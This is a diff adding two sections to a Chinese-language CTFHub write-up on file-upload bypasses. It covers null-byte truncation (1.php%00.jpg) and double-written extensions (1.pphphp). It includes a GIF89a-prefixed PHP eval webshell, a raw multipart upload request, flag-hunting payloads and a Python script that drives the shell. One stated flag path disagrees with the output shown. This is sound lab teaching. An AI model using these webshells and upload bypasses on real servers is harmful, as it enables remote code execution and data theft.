@@ -1833,3 +1833,273 @@ string(42) "<?php // ctfhub{becfee4f61d8fedf783838d9}
 提交`ctfhub{becfee4f61d8fedf783838d9}`即可。
 
 ------
+
+### 00截断
+
+> 了解一下 PHP 5.2 00截断上传的原理
+
+00截断，也称为空字节截断，依赖于**早期PHP版本（通常指小于5.3.4）** 中的一个特性：C语言风格的字符串处理函数会将空字节（`%00` 或 `0x00`，ASCII码为0x00）视为字符串的结束符（通常写作`\0`）。当这样的函数处理文件名时，**空字节后的内容会被忽略**。
+
+|    00截断    |                             说明                             |
+| :----------: | :----------------------------------------------------------: |
+| **核心原理** | 利用空字节(`%00`)在低版本PHP中作为字符串终止符的特性，截断文件名后缀，绕过白名单检查。 |
+| **利用条件** |     PHP版本通常小于5.3.4；`magic_quotes_gpc`设置为Off。      |
+| **关键步骤** | 在文件名或GET参数中插入`%00`（URL编码形式），使得后续后缀被忽略。 |
+| **常见位置** | 文件名（如`shell.php%00.jpg`）或GET参数（如`?road=/path/to/shell.php%00`）。 |
+| **防御措施** | 升级PHP版本；对用户输入进行严格过滤和验证；在服务器端检查文件内容（如MIME类型、魔术字节）。 |
+
+查看网页源码：
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>CTFHub 文件上传 - 00截断</title>
+</head>
+
+<body>
+    <h1>CTFHub 文件上传 - 00截断</h1>
+    <form action=?road=/var/www/html/upload/ method="post" enctype="multipart/form-data">
+        <label for="file">Filename:</label>
+        <input type="file" name="file" id="file" />
+        <br />
+        <input type="submit" name="submit" value="Submit" />
+    </form>
+<!--
+if (!empty($_POST['submit'])) {
+    $name = basename($_FILES['file']['name']);
+    $info = pathinfo($name);
+    $ext = $info['extension'];
+    $whitelist = array("jpg", "png", "gif");
+    if (in_array($ext, $whitelist)) {
+        $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
+        if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) {
+            echo "<script>alert('上传成功')</script>";
+        } else {
+            echo "<script>alert('上传失败')</script>";
+        }
+    } else {
+        echo "文件类型不匹配";
+    }
+}
+-->
+</body>
+</html>
+```
+
+关键代码部分如下：
+
+```php
+$name = basename($_FILES['file']['name']);
+$info = pathinfo($name);
+$ext = $info['extension'];
+$whitelist = array("jpg", "png", "gif");
+if (in_array($ext, $whitelist)) {
+    $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) {
+        echo "<script>alert('上传成功')</script>";
+    } else {
+        echo "<script>alert('上传失败')</script>";
+    }
+}
+```
+
+先编写`PHP`一句话木马文件。
+
+```
+GIF89a
+<?php @eval($_POST['t0ur1st']); ?>
+```
+
+我们需要用`burp suite`抓包修改`POST`请求。
+
+文件路径为`/?road=/var/www/html/upload/1.php%00.jpg`，文件名`filename="1.php%00.jpg"`。
+
+上传成功后可以在`/upload/1.php`访问木马文件。直接用`AntSword`连接木马文件控制靶机找`flag`。
+
+也可以用`HackBar`构造`POST`请求。在常见的位置查找`flag`文件。
+
+```php
+t0ur1st=var_dump(array_merge(
+    glob('/*flag*'),
+    glob('/home/*/*flag*'),
+    glob('/var/www/*/*flag*'),
+    glob('/tmp/*flag*')
+));
+```
+
+靶机信息如下，`flag`文件路径为`/var/www/html/flag_858924154.php`。
+
+> GIF89a array(1) { [0]=> string(33) "/var/www/html/flag_2167916188.php" }
+
+查看`flag`文件内容。
+
+```php
+t0ur1st=var_dump(file_get_contents('/var/www/html/flag_2167916188.php'));
+```
+
+右键查看网页源码，在注释中可以找到`flag`。
+
+> GIF89a
+> string(42) "<?php // ctfhub{b3175e741fecc7f08b06371a}
+> "
+
+提交`ctfhub{b3175e741fecc7f08b06371a}`即可。
+
+------
+
+### 双写后缀
+
+查看网页源码：
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>CTFHub 文件上传——双写绕过</title>
+</head>
+
+<body>
+    <h1>CTFHub 文件上传——双写绕过</h1>
+    <form action="" method="post" enctype="multipart/form-data">
+        <label for="file">Filename:</label>
+        <input type="file" name="file" id="file" />
+        <br />
+        <input type="submit" name="submit" value="Submit" />
+    </form>
+    <p></p>
+</body>
+</html>
+
+<!--
+$name = basename($_FILES['file']['name']);
+$blacklist = array("php", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess", "ini");
+$name = str_ireplace($blacklist, "", $name);
+-->
+```
+
+编写`PHP`一句话木马。
+
+```php
+GIF89a
+<?php @eval($_POST['t0ur1st']); ?>
+```
+
+用`burp suite`抓包修改`POST`请求中的`MIME`类型后，靶机显示信息如下：
+
+> 上传文件相对路径
+> upload/1.
+
+很明显，文件后缀名被替换掉了，根据题目名称，尝试使用双写后缀绕过，即上传文件名为`1.pphphp`。
+
+用`burp suite`抓包修改`POST`请求，双写后缀绕过。
+
+```
+POST / HTTP/1.1
+Host: challenge-e0a1a32b385c0740.sandbox.ctfhub.com:10800
+Content-Length: 334
+Cache-Control: max-age=0
+Origin: http://challenge-e0a1a32b385c0740.sandbox.ctfhub.com:10800
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynK2B2YExV5nmQ7wA
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://challenge-e0a1a32b385c0740.sandbox.ctfhub.com:10800/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+------WebKitFormBoundarynK2B2YExV5nmQ7wA
+Content-Disposition: form-data; name="file"; filename="1.pphphp"
+Content-Type: application/octet-stream
+
+GIF89a
+<?php @eval($_POST['t0ur1st']); ?>
+------WebKitFormBoundarynK2B2YExV5nmQ7wA
+Content-Disposition: form-data; name="submit"
+
+Submit
+------WebKitFormBoundarynK2B2YExV5nmQ7wA--
+```
+
+文件上传成功后，靶机显示信息如下：
+
+> 上传文件相对路径
+> upload/1.php
+
+我们可以直接用`AntSword`连接靶机，拿到靶机控制权限后找出`flag`。
+
+也可以使用`HackBar`构造`POST`请求访问`/upload/1.php`。在常见的位置查找`flag`文件。
+
+```php
+t0ur1st=var_dump(array_merge(
+    glob('/*flag*'),
+    glob('/home/*/*flag*'),
+    glob('/var/www/*/*flag*'),
+    glob('/tmp/*flag*')
+));
+```
+
+靶机信息如下，`flag`文件路径为`/var/www/html/flag_2202129874.php`。
+
+> GIF89a array(1) { [0]=> string(33) "/var/www/html/flag_2202129874.php" }
+
+查看`flag`文件内容。
+
+```php
+t0ur1st=var_dump(file_get_contents('/var/www/html/flag_2202129874.php'));
+```
+
+右键查看网页源码，在注释中可以找到`flag`。
+
+>GIF89a
+>string(42) "<?php // ctfhub{8e74299472595775b12434ed}
+>"
+
+或者直接用`python`代码构造`POST`请求连接一句话木马读取`flag`文件。
+
+```python
+import requests
+import re
+
+url = 'http://challenge-e0a1a32b385c0740.sandbox.ctfhub.com:10800/upload/1.php'
+payload_find = "var_dump(array_merge(glob('*/flag*'), glob('/home/*/*flag*'), glob('/var/www/*/*flag*'), glob('/tmp/*flag*')));"
+response1 = requests.post(url, data={"t0ur1st": payload_find})
+print("=== Find flag files ===")
+print(response1.text)
+
+match = re.search(r'string\(\d+\)\s+"([^"]+)"', response1.text)
+if match:
+    flag_path = match.group(1)
+    print("Found flag file:", flag_path)
+    payload_read = f"var_dump(file_get_contents('{flag_path}'));"
+    response2 = requests.post(url, data={"t0ur1st": payload_read})
+    print("\n=== Read flag content ===")
+    print(response2.text)
+else:
+    print("No flag path found.")
+```
+
+`python`代码运行结果如下：
+
+```python
+=== Find flag files ===
+GIF89a
+array(1) {
+  [0]=>
+  string(33) "/var/www/html/flag_2202129874.php"
+}
+
+Found flag file: /var/www/html/flag_2202129874.php
+
+=== Read flag content ===
+GIF89a
+string(42) "<?php // ctfhub{8e74299472595775b12434ed}
+"
+```
+
+提交`ctfhub{8e74299472595775b12434ed}`即可。
+
+------
